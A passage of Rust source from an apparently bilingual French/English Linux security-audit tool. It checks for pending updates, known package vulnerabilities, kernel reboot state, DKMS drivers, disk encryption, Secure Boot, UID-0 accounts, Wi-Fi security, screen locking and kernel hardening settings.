                    Niveau::Moyen,
                    trf!(
                        "{} application(s) Flatpak à mettre à jour.",
                        "{} Flatpak app(s) to update.",
                        lignes(&l)
                    ),
                )
                .corriger(
                    tr!("Mettre à jour les applications Flatpak", "Update the Flatpak apps"),
                    &["flatpak update -y"],
                ),
            });
        }
        if let Some(t) = snap {
            // « All snaps up to date » part sur la sortie d'erreur : sortie vide = à jour. Une ligne d'en-tête sinon.
            constats.push(match t.join().ok().flatten() {
                None => impossible("Snap", tr!("snapd injoignable", "snapd unreachable")),
                Some(l) if lignes(&l) <= 1 => ok("Snap", tr!("Paquets Snap à jour.", "Snap packages up to date.")),
                Some(l) => alerte(
                    "Snap",
                    Niveau::Moyen,
                    trf!(
                        "{} paquet(s) Snap à mettre à jour.",
                        "{} Snap package(s) to update.",
                        lignes(&l) - 1
                    ),
                )
                .corriger(
                    tr!("Mettre à jour les paquets Snap", "Update the Snap packages"),
                    &["sudo snap refresh"],
                ),
            });
        }
        if let Some((outil, t)) = aur {
            constats.push(match t.join().ok().flatten() {
                None => impossible("AUR", tr!("hors ligne ?", "offline?")),
                Some(l) if lignes(&l) == 0 => ok("AUR", tr!("Paquets AUR à jour.", "AUR packages up to date.")),
                Some(l) => alerte(
                    "AUR",
                    Niveau::Moyen,
                    trf!(
                        "{} paquet(s) AUR à mettre à jour.",
                        "{} AUR package(s) to update.",
                        lignes(&l)
                    ),
                )
                .manuel(
                    tr!(
                        "Les paquets AUR se compilent : mets-les à jour toi-même et relis ce qui change",
                        "AUR packages are compiled: update them yourself and read what changes"
                    ),
                    &[&format!("{outil} -Sua")],
                ),
            });
        }
        if let Some(t) = firmware {
            let json = t
                .join()
                .ok()
                .flatten()
                .and_then(|j| serde_json::from_str::<serde_json::Value>(&j).ok());
            constats.push(match json {
                None => impossible(
                    "Firmware",
                    tr!(
                        "métadonnées fwupd absentes : fwupdmgr refresh",
                        "fwupd metadata missing: fwupdmgr refresh"
                    ),
                ),
                Some(v) => {
                    let appareils: Vec<String> = v["Devices"]
                        .as_array()
                        .into_iter()
                        .flatten()
                        .filter(|d| d["Releases"].as_array().is_some_and(|r| !r.is_empty()))
                        .filter_map(|d| d["Name"].as_str().map(str::to_string))
                        .collect();
                    if appareils.is_empty() {
                        ok(
                            "Firmware",
                            tr!(
                                "Firmwares à jour (BIOS, SSD, périphériques).",
                                "Firmware up to date (BIOS, SSD, devices)."
                            ),
                        )
                    } else {
                        alerte(
                            "Firmware",
                            Niveau::Moyen,
                            trf!(
                                "Mise à jour de firmware disponible : {}.",
                                "Firmware update available: {}.",
                                appareils.join(", ")
                            ),
                        )
                        .manuel(
                            tr!(
                                "Installer les firmwares (un redémarrage peut être demandé)",
                                "Install the firmware (a restart may be requested)"
                            ),
                            &["fwupdmgr update"],
                        )
                    }
                }
            });
        }
    });
    constats
}

/// Âge en jours de la liste des paquets d'apt, `None` si elle n'a jamais été téléchargée.
fn age_cache_apt() -> Option<u64> {
    let plus_recent = std::fs::read_dir("/var/lib/apt/lists")
        .ok()?
        .flatten()
        .filter(|f| {
            f.file_name().to_string_lossy().ends_with("Packages")
                || f.file_name().to_string_lossy().contains("Packages.")
        })
        .filter_map(|f| f.metadata().ok()?.modified().ok())
        .max()?;
    Some(plus_recent.elapsed().map_or(0, |d| d.as_secs() / 86_400))
}

fn mises_a_jour() -> Constat {
    let Some(gestion) = Paquets::detecter() else {
        return impossible(
            "Mises à jour",
            tr!("gestionnaire de paquets non reconnu", "package manager not recognized"),
        );
    };
    let Some(liste) = liste_mises_a_jour(gestion) else {
        let raison = if gestion == Paquets::Apt {
            tr!("liste des paquets jamais téléchargée", "package list never downloaded")
        } else {
            tr!("outil absent ou hors ligne", "tool missing or offline")
        };
        return impossible("Mises à jour", raison).corriger(
            tr!(
                "Télécharger la liste des paquets et mettre à jour",
                "Download the package list and update"
            ),
            &[gestion.mise_a_jour()],
        );
    };
    // apt ne connaît que les mises à jour vues à son dernier « apt update » : une vieille liste en cache tout.
    let vieux = (gestion == Paquets::Apt)
        .then(age_cache_apt)
        .flatten()
        .filter(|&j| j > 7);
    if liste.is_empty() {
        return match vieux {
            Some(j) => alerte(
                "Mises à jour",
                Niveau::Moyen,
                trf!(
                    "Aucune mise à jour connue, mais la liste date de {j} jours.",
                    "No known update, but the list is {j} days old."
                ),
            )
            .corriger(
                tr!("Rafraîchir la liste et mettre à jour", "Refresh the list and update"),
                &[gestion.mise_a_jour()],
            ),
            None => ok("Mises à jour", tr!("Système à jour.", "System up to date.")),
        };
    }
    let n = liste.len();
    let sensibles = liste
        .iter()
        .filter(|l| {
            let nom = l.trim_start_matches("v | ").to_ascii_lowercase();
            [
                "linux", "openssl", "libssl", "openssh", "glibc", "libc6", "sudo", "firefox", "chromium", "nvidia",
            ]
            .iter()
            .any(|p| nom.starts_with(p))
        })
        .count();
    let niveau = if n > 50 || sensibles > 0 {
        Niveau::Eleve
    } else {
        Niveau::Moyen
    };
    alerte(
        "Mises à jour",
        niveau,
        trf!(
            "{n} paquet(s) à mettre à jour, dont {sensibles} sensible(s) : noyau, openssl, navigateur…",
            "{n} package(s) to update, {sensibles} of them sensitive: kernel, openssl, browser…"
        ),
    )
    .corriger(
        tr!("Mettre le système à jour", "Update the system"),
        &[gestion.mise_a_jour()],
    )
}

/// Paquet installé touché par une faille publiée (CVE, avis de sécurité de la distribution).
#[derive(Debug, PartialEq)]
struct Faille {
    paquet: String,
    gravite: Niveau,
    /// Une version corrigée est déjà dans les dépôts : la mise à jour suffit.
    corrigee: bool,
}

/// Gravité écrite par les distributions (anglais), en niveau de sentinel. Inconnue : on ne minimise pas.
fn gravite(texte: &str) -> Niveau {
    match texte.trim().to_ascii_lowercase().as_str() {
        "critical" => Niveau::Critique,
        "high" | "important" => Niveau::Eleve,
        "low" | "unknown" | "none" => Niveau::Info,
        _ => Niveau::Moyen,
    }
}

/// arch-audit --json : groupes de failles avec la liste des paquets installés touchés.
fn failles_arch(json: &serde_json::Value) -> Vec<Faille> {
    json.as_array()
        .into_iter()
        .flatten()
        .flat_map(|g| {
            let gravite = gravite(g["severity"].as_str().unwrap_or("unknown"));
            let corrigee = g["fixed"].as_str().is_some_and(|v| !v.is_empty());
            g["packages"].as_array().into_iter().flatten().filter_map(move |p| {
                Some(Faille {
                    paquet: p.as_str()?.to_string(),
                    gravite,
                    corrigee,
                })
            })
        })
        .collect()
}

/// apt list --upgradable : une mise à jour venue d'un dépôt « -security » (noble-security, stable-security…)
/// corrige une faille. apt ne donne pas la gravité.
fn failles_apt(lignes: &[String]) -> Vec<Faille> {
    lignes
        .iter()
        .filter_map(|l| {
            let (nom, reste) = l.split_once('/')?;
            let depots = reste.split_whitespace().next()?;
            depots.split(',').any(|d| d.ends_with("-security")).then(|| Faille {
                paquet: nom.to_string(),
                gravite: Niveau::Eleve,
                corrigee: true,
            })
        })
        .collect()
}

/// dnf updateinfo list --security. dnf 4 : « FEDORA-2024-1a2b Important/Sec. curl-8.6.0-7.fc40.x86_64 » ;
/// dnf 5 : « FEDORA-2024-1a2b security Important curl-8.6.0-7.fc40.x86_64 2024-04-01 00:43:20 ».
fn failles_dnf(texte: &str) -> Vec<Faille> {
    texte
        .lines()
        .filter_map(|l| {
            let mots: Vec<&str> = l.split_whitespace().collect();
            let (gravite_txt, paquet) = match mots.as_slice() {
                [_, g, p, ..] if g.ends_with("/Sec.") => (g.trim_end_matches("/Sec."), *p),
                [_, "security", g, p, ..] => (*g, *p),
                _ => return None,
            };
            // nom-version-révision.arch → nom
            let nom = paquet.rsplitn(3, '-').nth(2)?;
            Some(Faille {
                paquet: nom.to_string(),
                gravite: gravite(gravite_txt),
                corrigee: true,
            })
        })
        .collect()
}

/// zypper list-patches --category security : tableau « dépôt | nom | catégorie | gravité | interactif | état | résumé ».
fn failles_zypper(texte: &str) -> Vec<Faille> {
    texte
        .lines()
        .filter_map(|l| {
            let c: Vec<&str> = l.split('|').map(str::trim).collect();
            (c.len() >= 6 && c[2] == "security" && c[5].starts_with("needed")).then(|| Faille {
                paquet: c[1].to_string(),
                gravite: gravite(c[3]),
                corrigee: true,
            })
        })
        .collect()
}

/// Failles connues des paquets installés, d'après le suivi de sécurité de la distribution.
fn failles_connues() -> Constat {
    const CAT: &str = "Failles connues";
    let Some(gestion) = Paquets::detecter() else {
        return impossible(
            CAT,
            tr!("gestionnaire de paquets non reconnu", "package manager not recognized"),
        );
    };
    let failles = match gestion {
        Paquets::Pacman => {
            if !Path::new("/usr/bin/arch-audit").exists() {
                return impossible(CAT, tr!("arch-audit absent", "arch-audit missing")).corriger(
                    tr!(
                        "Installer arch-audit, qui lit le suivi de sécurité d'Arch (security.archlinux.org)",
                        "Install arch-audit, which reads the Arch security tracker (security.archlinux.org)"
                    ),
                    &[&gestion.installer("arch-audit")],
                );
            }
            match sortie_delai("arch-audit", &["--json"], 40, &[0])
                .and_then(|t| serde_json::from_str::<serde_json::Value>(&t).ok())
            {
                Some(json) => failles_arch(&json),
                None => {
                    return impossible(
                        CAT,
                        tr!(
                            "suivi de sécurité injoignable, hors ligne ?",
                            "security tracker unreachable, offline?"
                        ),
                    );
                }
            }
        }
        Paquets::Apt => match liste_mises_a_jour(gestion) {
            Some(l) => failles_apt(&l),
            None => {
                return impossible(
                    CAT,
                    tr!("liste des paquets jamais téléchargée", "package list never downloaded"),
                );
            }
        },
        Paquets::Dnf => {
            match crate::commande::lancer(
                Command::new("dnf")
                    .args(["-q", "updateinfo", "list", "--security"])
                    .env("LC_ALL", "C"),
                120,
            ) {
                Some(r) if r.code == Some(0) => failles_dnf(&r.sortie),
                _ => {
                    return impossible(
                        CAT,
                        tr!(
                            "avis de sécurité de dnf injoignables, hors ligne ?",
                            "dnf security advisories unreachable, offline?"
                        ),
                    );
                }
            }
        }
        Paquets::Zypper => {
            match crate::commande::lancer(
                Command::new("zypper")
                    .args(["-q", "list-patches", "--category", "security"])
                    .env("LC_ALL", "C"),
                120,
            ) {
                Some(r) if r.code == Some(0) => failles_zypper(&r.sortie),
                _ => {
                    return impossible(
                        CAT,
                        tr!(
                            "avis de sécurité de zypper injoignables, hors ligne ?",
                            "zypper security advisories unreachable, offline?"
                        ),
                    );
                }
            }
        }
    };
    bilan_failles(gestion, &failles)
}

fn bilan_failles(gestion: Paquets, failles: &[Faille]) -> Constat {
    const CAT: &str = "Failles connues";
    let noms = |corrigee: bool| {
        let mut n: Vec<&str> = failles
            .iter()
            .filter(|f| f.corrigee == corrigee)
            .map(|f| f.paquet.as_str())
            .collect();
        n.sort_unstable();
        n.dedup();
        n
    };
    let (a_corriger, sans_correctif) = (noms(true), noms(false));
    let resume = |n: &[&str]| crate::ui::resume(n, 8, ", ");
    // Une faille sans correctif publié : rien à faire de ton côté, la mise à jour viendra. Le suivi d'Arch garde
    // souvent des failles corrigées en amont : on le dit, sans baisser la note.
    let attente = (!sans_correctif.is_empty()).then(|| {
        trf!(
            "{} paquet(s) touché(s) par une faille encore sans correctif publié : {}.",
            "{} package(s) affected by a flaw with no published fix yet: {}.",
            sans_correctif.len(),
            resume(&sans_correctif)
        )
    });
    if a_corriger.is_empty() {
        return match attente {
            Some(t) => alerte(
                CAT,
                Niveau::Info,
                trf!("Aucune faille corrigée en attente. {t}", "No fixed flaw pending. {t}"),
            ),
            None => ok(
                CAT,
                tr!(
                    "Aucun paquet installé n'a de faille connue.",
                    "No installed package has a known flaw."
                ),
            ),
        };
    }
    let pire = failles
        .iter()
        .filter(|f| f.corrigee)
        .map(|f| f.gravite)
        .max()
        .unwrap_or(Niveau::Moyen)
        .max(Niveau::Moyen);
    let mut message = trf!(
        "{} paquet(s) avec une faille connue, déjà corrigée dans les dépôts : {}.",
        "{} package(s) with a known flaw, already fixed in the repositories: {}.",
        a_corriger.len(),
        resume(&a_corriger)
    );
    if let Some(t) = attente {
        let _ = write!(message, " {t}");
    }
    alerte(CAT, pire, message).corriger(
        tr!("Installer les correctifs de sécurité", "Install the security fixes"),
        &[gestion.mise_a_jour()],
    )
}

/// Version du noyau qui tourne (« 7.2.5-3-omarchy »).
fn noyau_en_cours() -> String {
    std::fs::read_to_string("/proc/sys/kernel/osrelease")
        .ok()
        .or_else(|| sortie("uname", &["-r"]))
        .unwrap_or_default()
        .trim()
        .to_string()
}

/// Dossiers des noyaux installés, un par version. Un vrai noyau a son image (dans son dossier, ou /boot sous Debian)
/// ou ses modules ; on écarte les restes vides. /lib/modules est souvent le même dossier que /usr/lib/modules.
fn noyaux_installes() -> Vec<std::path::PathBuf> {
    let mut noyaux: Vec<std::path::PathBuf> = ["/usr/lib/modules", "/lib/modules"]
        .iter()
        .filter_map(|d| std::fs::read_dir(d).ok())
        .flatten()
        .flatten()
        .map(|e| e.path())
        .filter(|p| {
            let nom = p.file_name().unwrap_or_default().to_string_lossy();
            p.join("modules.dep").exists()
                || p.join("vmlinuz").exists()
                || Path::new(&format!("/boot/vmlinuz-{nom}")).exists()
        })
        .collect();
    noyaux.sort_by(|a, b| a.file_name().cmp(&b.file_name()));
    noyaux.dedup_by(|a, b| a.file_name() == b.file_name());
    noyaux
}

fn redemarrage() -> Constat {
    let noyau = noyau_en_cours();
    let installes = noyaux_installes();
    // Aucun noyau ici (conteneur, noyau fourni par l'hôte) : rien à comparer.
    if installes.is_empty() {
        return impossible(
            "Noyau",
            tr!(
                "aucun noyau installé ici, conteneur ?",
                "no kernel installed here, container?"
            ),
        );
    }
    let en_cours = installes
        .iter()
        .any(|p| p.file_name().is_some_and(|n| n.to_string_lossy() == noyau));
    // Fedora, openSUSE et Debian gardent plusieurs noyaux : le plus récemment installé doit être celui qui tourne.
    let plus_recent = installes
        .iter()
        .max_by_key(|p| p.metadata().and_then(|m| m.modified()).ok())
        .and_then(|p| p.file_name())
        .map(|n| n.to_string_lossy().into_owned());
    // Arch efface le dossier de l'ancien noyau à la mise à jour : s'il existe encore, le noyau chargé est le bon.
    // La date n'y veut rien dire : avec linux + linux-lts (ou DKMS qui recompile pour chacun), le dernier
    // dossier touché n'est pas forcément celui qui devrait tourner.
    let dernier_installe =
        Paquets::detecter() == Some(Paquets::Pacman) || plus_recent.as_deref() == Some(noyau.as_str());
    let a_jour = en_cours && dernier_installe && !Path::new("/var/run/reboot-required").exists();
    if a_jour {
        ok(
            "Noyau",
            trf!(
                "Le noyau en cours ({noyau}) est le plus récent installé.",
                "The running kernel ({noyau}) is the newest installed."
            ),
        )
    } else {
        let nouveau = plus_recent
            .filter(|n| *n != noyau)
            .map(|n| format!(" ({n})"))
            .unwrap_or_default();
        alerte(
            "Noyau",
            Niveau::Moyen,
            trf!(
                "Noyau plus récent installé{nouveau} mais pas encore chargé : les correctifs ne sont pas actifs.",
                "Newer kernel installed{nouveau} but not loaded yet: its fixes are not active."
            ),
        )
        .manuel(
            tr!("Redémarrer quand c'est pratique", "Restart when convenient"),
            &["systemctl reboot"],
        )
    }
}

/// Modules de « dkms status » et, pour chacun, les noyaux de `noyaux` où il n'est pas installé.
/// Lignes « nvidia/610.57, 7.2.5-arch1, x86_64: installed » (ancien format : « nvidia, 610.57, 7.2.5, x86_64: »).
fn dkms_manquants(status: &str, noyaux: &[String]) -> Vec<(String, Vec<String>)> {
    // Chaque module, dans l'ordre de « dkms status », avec les noyaux où il est installé.
    let mut modules: Vec<(String, Vec<String>)> = Vec::new();
    for l in status.lines() {
        let Some((gauche, etat)) = l.split_once(": ") else {
            continue;
        };
        let parties: Vec<&str> = gauche.split(", ").map(str::trim).collect();
        let (nom, noyau) = match parties.first() {
            Some(p) if p.contains('/') => (p.split('/').next().unwrap_or(p), parties.get(1)),
            Some(p) => (*p, parties.get(2)),
            None => continue,
        };
        if nom.is_empty() {
            continue;
        }
        let i = modules.iter().position(|(m, _)| m == nom).unwrap_or_else(|| {
            modules.push((nom.to_string(), Vec::new()));
            modules.len() - 1
        });
        if let Some(k) = noyau
            && etat.trim_start().starts_with("installed")
        {
            modules[i].1.push((*k).to_string());
        }
    }
    modules
        .into_iter()
        .map(|(m, installes)| (m, noyaux.iter().filter(|k| !installes.contains(k)).cloned().collect()))
        .collect()
}

/// Pilotes DKMS (NVIDIA, manette, VirtualBox…) : recompilés pour chaque noyau. S'il en manque un pour le noyau
/// qu'on va démarrer, c'est l'écran noir ou un périphérique muet au prochain démarrage.
fn pilotes_dkms() -> Option<Constat> {
    let status = sortie("dkms", &["status"])?;
    let mut noyaux: Vec<String> = noyaux_installes()
        .iter()
        .filter_map(|p| Some(p.file_name()?.to_string_lossy().into_owned()))
        .collect();
    let en_cours = noyau_en_cours();
    if !en_cours.is_empty() && !noyaux.contains(&en_cours) {
        noyaux.push(en_cours);
    }
    let modules = dkms_manquants(&status, &noyaux);
    if modules.is_empty() {
        return None;
    }
    let mut a_refaire: Vec<String> = modules.iter().flat_map(|(_, k)| k.clone()).collect();
    a_refaire.sort();
    a_refaire.dedup();
    if a_refaire.is_empty() {
        return Some(ok(
            "Pilotes DKMS",
            trf!(
                "{} compilé(s) pour chaque noyau installé.",
                "{} built for every installed kernel.",
                modules.iter().map(|(m, _)| m.as_str()).collect::<Vec<_>>().join(", ")
            ),
        ));
    }
    let detail: Vec<String> = modules
        .iter()
        .filter(|(_, k)| !k.is_empty())
        .map(|(m, k)| trf!("{m} (noyau {})", "{m} (kernel {})", k.join(", ")))
        .collect();
    Some(
        alerte(
            "Pilotes DKMS",
            Niveau::Eleve,
            trf!(
                "Pilote pas compilé : {}. Écran noir ou périphérique muet possible au prochain démarrage.",
                "Driver not built: {}. Black screen or silent device possible at the next boot.",
                detail.join(", ")
            ),
        )
        .corriger(
            tr!(
                "Recompiler les pilotes DKMS (les en-têtes du noyau doivent être installés)",
                "Rebuild the DKMS drivers (the kernel headers must be installed)"
            ),
            &a_refaire
                .iter()
                .map(|k| format!("sudo dkms autoinstall -k {k}"))
                .collect::<Vec<_>>(),
        ),
    )
}

/// Tout ce qui doit être à jour : paquets, Flatpak, Snap, AUR, firmware, pilotes DKMS, noyau chargé. En parallèle :
/// la liste des paquets interroge les dépôts (jusqu'à 30 s) pendant que le reste se vérifie.
/// `seulement` : les catégories à revérifier (après une installation) ; le noyau chargé est toujours vérifié.
pub fn mises_a_jour_completes(seulement: Option<&[&str]>) -> Vec<Constat> {
    let voulu = |categories: &[&str]| seulement.is_none_or(|s| categories.iter().any(|c| s.contains(c)));
    std::thread::scope(|portee| {
        let paquets = voulu(&["Mises à jour"]).then(|| portee.spawn(mises_a_jour));
        let autres = voulu(&["Flatpak", "Snap", "AUR", "Firmware"]).then(|| portee.spawn(autres_mises_a_jour));
        let dkms = voulu(&["Pilotes DKMS"]).then(|| portee.spawn(pilotes_dkms));
        let noyau = redemarrage();
        let mut constats: Vec<Constat> = paquets
            .map(|t| {
                t.join().unwrap_or_else(|_| {
                    impossible("Mises à jour", tr!("vérification interrompue", "check interrupted"))
                })
            })
            .into_iter()
            .collect();
        constats.extend(autres.map(|t| t.join().unwrap_or_default()).unwrap_or_default());
        constats.extend(dkms.and_then(|t| t.join().ok().flatten()));
        constats.push(noyau);
        constats
    })
}

/// Le système de fichiers racine repose-t-il sur un volume chiffré (LUKS, éventuellement sous LVM) ?
/// `None` si on ne peut pas remonter la chaîne des périphériques.
fn racine_chiffree() -> Option<bool> {
    let source = sortie("findmnt", &["-no", "SOURCE", "/"])?;
    // Btrfs affiche le sous-volume : « /dev/mapper/root[/@] ».
    let peripherique = source.trim().split('[').next()?.to_string();
    if !peripherique.starts_with("/dev/") {
        return None;
    }
    // -s : la chaîne inverse, du volume monté jusqu'au disque (lvm → crypt → part → disk).
    let chaine = sortie("lsblk", &["-nso", "TYPE", &peripherique])?;
    Some(chaine.lines().any(|l| l.trim() == "crypt"))
}

fn chiffrement_disque() -> Constat {
    // On vérifie le volume du système lui-même : un swap chiffré seul ne protège pas les données.
    match racine_chiffree() {
        Some(true) => ok("Chiffrement", tr!("Système chiffré (LUKS).", "System encrypted (LUKS).")),
        None => impossible("Chiffrement", tr!("volume racine introuvable, conteneur ?", "root volume not found, container?")),
        Some(false) => alerte(
            "Chiffrement",
            Niveau::Moyen,
            tr!("Le système n'est pas chiffré : en cas de vol, les données sont lisibles.", "The system is not encrypted: if stolen, the data can be read."),
        )
        .manuel(
            tr!("Le chiffrement complet se choisit à l'installation (Omarchy le propose) : à prévoir à la prochaine réinstallation", "Full encryption is chosen at install time (Omarchy offers it): plan it for the next reinstall"),
            &[],
        ),
    }
}

fn demarrage_securise() -> Constat {
    let actif = std::fs::read_dir("/sys/firmware/efi/efivars")
        .ok()
        .and_then(|d| {
            d.flatten()
                .find(|f| f.file_name().to_string_lossy().starts_with("SecureBoot-"))
        })
        .and_then(|f| std::fs::read(f.path()).ok())
        .is_some_and(|o| o.last() == Some(&1));
    if actif {
        ok("Secure Boot", tr!("Démarrage sécurisé actif.", "Secure Boot on."))
    } else {
        alerte("Secure Boot", Niveau::Info, tr!("Secure Boot désactivé (protège contre les bootkits).", "Secure Boot off (it protects against bootkits)."))
            .manuel(tr!("Se configure avec sbctl puis dans le BIOS ; voir le wiki Arch « Unified Extensible Firmware Interface/Secure Boot »", "Set up with sbctl, then in the BIOS; see the Arch wiki “Unified Extensible Firmware Interface/Secure Boot”"), &[])
    }
}

fn comptes() -> Constat {
    let Ok(passwd) = std::fs::read_to_string("/etc/passwd") else {
        return impossible("Comptes", tr!("/etc/passwd illisible", "/etc/passwd unreadable"));
    };
    let uid0: Vec<&str> = passwd
        .lines()
        .filter_map(|l| {
            let c: Vec<&str> = l.split(':').collect();
            (c.get(2) == Some(&"0") && c[0] != "root").then_some(c[0])
        })
        .collect();
    if uid0.is_empty() {
        ok("Comptes", tr!("Seul root a l'UID 0.", "Only root has UID 0."))
    } else {
        alerte(
            "Comptes",
            Niveau::Critique,
            trf!(
                "Comptes avec droits root cachés (UID 0) : {}",
                "Hidden accounts with root rights (UID 0): {}",
                uid0.join(", ")
            ),
        )
        .manuel(
            tr!(
                "Signe possible d'intrusion : ne pas supprimer à l'aveugle, vérifier d'abord leur origine",
                "Possible sign of intrusion: do not delete blindly, check where they come from first"
            ),
            &["grep ':0:' /etc/passwd"],
        )
    }
}

fn wifi(passerelle: Option<String>) -> Option<Constat> {
    // SSID en dernier et sans échappement : un nom de réseau contenant « : » reste intact.
    let s = sortie(
        "nmcli",
        &["-t", "-e", "no", "-f", "ACTIVE,SECURITY,SSID", "dev", "wifi"],
    )?;
    let actif = s.lines().find(|l| l.starts_with("yes:"))?;
    let mut c = actif.splitn(3, ':').skip(1);
    let (secu, ssid) = (c.next().unwrap_or("").to_string(), c.next()?.to_string());
    let admin = format!(
        "xdg-open https://{}",
        passerelle.unwrap_or_else(|| "192.168.1.1".into())
    );
    let routeur = tr!(
        "Ouvrir l'admin du routeur > Wi-Fi > Sécurité : choisir « WPA2/WPA3 » ou « WPA3 »",
        "Open the router admin > Wi-Fi > Security: choose “WPA2/WPA3” or “WPA3”"
    );
    Some(if secu.is_empty() || secu == "--" {
        alerte(
            "Wi-Fi",
            Niveau::Eleve,
            trf!(
                "« {ssid} » est un réseau ouvert : le trafic non chiffré est visible.",
                "“{ssid}” is an open network: unencrypted traffic is visible."
            ),
        )
        .manuel(routeur, &[&admin])
    } else if secu.contains("WEP") || (secu.contains("WPA1") && !secu.contains("WPA2")) {
        alerte(
            "Wi-Fi",
            Niveau::Eleve,
            trf!(
                "« {ssid} » utilise {secu}, cassable en minutes.",
                "“{ssid}” uses {secu}, crackable in minutes."
            ),
        )
        .manuel(routeur, &[&admin])
    } else if secu.contains("WPA3") {
        ok("Wi-Fi", trf!("« {ssid} » en {secu}.", "“{ssid}” uses {secu}."))
    } else {
        alerte(
            "Wi-Fi",
            Niveau::Info,
            trf!(
                "« {ssid} » en {secu}. WPA3 serait mieux si le routeur le permet.",
                "“{ssid}” uses {secu}. WPA3 would be better if the router allows it."
            ),
        )
        .manuel(routeur, &[&admin])
    })
}

/// Verrouillage automatique de l'écran après inactivité, selon l'environnement de bureau.
fn verrouillage_ecran() -> Option<Constat> {
    // Pas de session graphique (serveur) : rien à verrouiller.
    if std::env::var_os("WAYLAND_DISPLAY").is_none() && std::env::var_os("DISPLAY").is_none() {
        return None;
    }
    let bureau = std::env::var("XDG_CURRENT_DESKTOP")
        .unwrap_or_default()
        .to_ascii_lowercase();
    let maison = Path::new(&home()).to_path_buf();
    // Délai de verrouillage en secondes : Some(0) = jamais, None = inconnu.
    let delai: Option<u64> = if Path::new("/usr/share/omarchy").exists() {
        // Omarchy : idle.lock dans shell.json (celui de l'utilisateur, sinon la valeur par défaut).
        [
            maison.join(".config/omarchy/shell.json"),
            "/usr/share/omarchy/config/omarchy/shell.json".into(),
        ]
        .iter()
        .filter_map(|p| std::fs::read_to_string(p).ok())
        .filter_map(|t| serde_json::from_str::<serde_json::Value>(&t).ok())
        .find_map(|v| v["idle"]["lock"].as_u64())
    } else if bureau.contains("gnome") || bureau.contains("cinnamon") || bureau.contains("x-cinnamon") {
        let racine = if bureau.contains("cinnamon") {
            "org.cinnamon.desktop"
        } else {
            "org.gnome.desktop"
        };
        let actif =
            sortie("gsettings", &["get", &format!("{racine}.screensaver"), "lock-enabled"]).map(|v| v.trim() == "true");
        let inactivite = sortie("gsettings", &["get", &format!("{racine}.session"), "idle-delay"])
            .and_then(|v| v.split_whitespace().last()?.parse::<u64>().ok());
        match (actif, inactivite) {
            (Some(false), _) => Some(0),
            (Some(true), Some(i)) => Some(i),
            _ => None,
        }
    } else if bureau.contains("kde") {
        // KDE : verrouillage actif par défaut après 5 minutes.
        let lire = |cle: &str| {
            ["kreadconfig6", "kreadconfig5"]
                .iter()
                .find_map(|k| sortie(k, &["--file", "kscreenlockerrc", "--group", "Daemon", "--key", cle]))
                .map(|v| v.trim().to_string())
        };
        if lire("Autolock").as_deref() == Some("false") {
            Some(0)
        } else {
            Some(lire("Timeout").and_then(|m| m.parse::<u64>().ok()).unwrap_or(5) * 60)
        }
    } else if bureau.contains("hyprland") {
        // Hyprland sans Omarchy : hypridle doit avoir un délai qui verrouille.
        std::fs::read_to_string(maison.join(".config/hypr/hypridle.conf"))
            .ok()
            .map(|t| u64::from(t.contains("lock") && sortie("pgrep", &["-x", "hypridle"]).is_some()))
    } else {
        None
    };
    Some(match delai {
        None => impossible(
            "Verrouillage",
            tr!(
                "environnement de bureau non reconnu",
                "desktop environment not recognized"
            ),
        ),
        Some(0) => alerte(
            "Verrouillage",
            Niveau::Moyen,
            tr!(
                "L'écran ne se verrouille jamais tout seul : un ordinateur laissé ouvert est accessible à tous.",
                "The screen never locks by itself: a computer left open is accessible to anyone."
            ),
        )
        .manuel(
            tr!(
                "Activer le verrouillage automatique (5 minutes, c'est bien) dans les réglages d'écran du bureau",
                "Turn on automatic locking (5 minutes is good) in the desktop's display settings"
            ),
            &[],
        ),
        Some(s) if s > 15 * 60 => alerte(
            "Verrouillage",
            Niveau::Info,
            trf!(
                "L'écran se verrouille après {} minutes : 5 à 10 minutes serait plus sûr.",
                "The screen locks after {} minutes: 5 to 10 minutes would be safer.",
                s / 60
            ),
        ),
        Some(s) if s >= 60 => ok(
            "Verrouillage",
            trf!(
                "L'écran se verrouille après {} minute(s) d'inactivité.",
                "The screen locks after {} minute(s) of inactivity.",
                s / 60
            ),
        ),
        Some(_) => ok(
            "Verrouillage",
            tr!(
                "L'écran se verrouille après inactivité.",
                "The screen locks after inactivity."
            ),
        ),
    })
}

/// Réglages de durcissement du noyau (lisibles sans droits) : (réglage, valeur sûre minimale, rôle en français
/// et en anglais ; une constante ne peut pas choisir la langue, `reglages_faibles` le fait).
const DURCISSEMENT: &[(&str, i64, (&str, &str))] = &[
    (
        "kernel/randomize_va_space",
        2,
        ("adresses mémoire aléatoires (ASLR)", "random memory addresses (ASLR)"),
    ),
    (
        "kernel/kptr_restrict",
        1,
        ("adresses du noyau cachées", "hidden kernel addresses"),
    ),
    (
        "kernel/dmesg_restrict",
        1,
        ("journal du noyau réservé à root", "kernel log reserved to root"),
    ),
    (
        "kernel/yama/ptrace_scope",
        1,
        (
            "un programme ne peut pas espionner les autres",
            "a program cannot spy on the others",
        ),
    ),
    (
        "fs/protected_symlinks",
        1,
        (
            "protection des liens symboliques dans /tmp",
            "symbolic link protection in /tmp",
        ),
    ),
    (
        "fs/protected_hardlinks",
        1,
        ("protection des liens physiques", "hard link protection"),
    ),
    (
        "net/ipv4/tcp_syncookies",
        1,
        ("résistance aux inondations SYN", "SYN flood resistance"),
    ),
];

/// Réglages trop faibles parmi les valeurs lues : (chemin, valeur lue, valeur sûre, rôle).
fn reglages_faibles(lire: impl Fn(&str) -> Option<i64>) -> Vec<(&'static str, i64, i64, &'static str)> {
    DURCISSEMENT
        .iter()
        .filter_map(|&(cle, min, (fr, en))| {
            let v = lire(cle)?;
            let role = if crate::langue::anglais() { en } else { fr };
            (v < min).then_some((cle, v, min, role))
        })
        .collect()
}

fn durcissement_noyau() -> Constat {
    let faibles = reglages_faibles(|cle| {
        std::fs::read_to_string(format!("/proc/sys/{cle}"))
            .ok()?
            .trim()
            .parse()
            .ok()
    });
    if faibles.is_empty() {
        return ok(
            "Noyau durci",
            tr!(
                "Réglages de sécurité du noyau corrects (ASLR, ptrace, dmesg, liens…).",
                "Kernel security settings are correct (ASLR, ptrace, dmesg, links…)."
            ),
        );
    }
    let niveau = if faibles.iter().any(|f| f.0 == "kernel/randomize_va_space") {
        Niveau::Moyen
    } else {
        Niveau::Info
    };
    let liste: Vec<String> = faibles
        .iter()
        .map(|(c, v, _, r)| format!("{} = {v} ({r})", c.replace('/', ".")))
        .collect();
    // Le fichier est réécrit en entier : on garde les réglages qu'une correction précédente y avait mis,
    // sinon ils sauteraient au prochain redémarrage.
    let lignes = fusion_sysctl(
        &std::fs::read_to_string(SYSCTL_SENTINEL)
